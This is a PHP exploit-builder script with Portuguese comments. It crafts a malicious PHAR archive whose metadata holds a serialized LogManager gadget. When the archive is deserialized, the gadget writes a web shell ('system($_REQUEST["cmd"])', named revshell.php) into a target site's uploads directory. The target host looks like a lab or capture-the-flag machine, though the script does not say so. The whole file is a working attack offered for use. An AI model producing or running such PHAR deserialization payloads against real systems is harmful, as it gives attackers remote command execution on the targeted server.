<?php
// create_shell_phar.php

// Classe conforme definido em app\classes\LogManager
namespace app\classes {
    class LogManager {
        public $path;
        public $file;
        public $content;
    }
}

namespace {
    // Caminho e nome do web shell a ser escrito
    $web_shell_path    = "/var/www/investmenthouse.hc/public/uploads/";
    $web_shell_name    = "revshell.php";
    $web_shell_content = '<?php system($_REQUEST["cmd"]); ?>';

    // Remove PHAR antigo
    @unlink("payload.phar");

    // Habilita criação de PHAR
    ini_set('phar.readonly', '0');

    // Cria o PHAR
    $phar = new \Phar("payload.phar");
    $phar->startBuffering();

    // Define o stub e encerra o compilador
    $phar->setStub("<?php __HALT_COMPILER(); ?>");

    // Instancia o gadget LogManager com os dados do shell
    $gadget = new \app\classes\LogManager();
    $gadget->path    = $web_shell_path;
    $gadget->file    = $web_shell_name;
    $gadget->content = $web_shell_content;

    // Injeta o gadget nos metadados do PHAR
    $phar->setMetadata($gadget);

    // Adiciona um arquivo dummy
    $phar->addFromString("test.txt", "dummy");

    // Finaliza o PHAR
    $phar->stopBuffering();

    echo "payload.phar criado com sucesso!\n";
    echo "[*] Ele escreverá o shell em: {$web_shell_path}{$web_shell_name}\n";
}
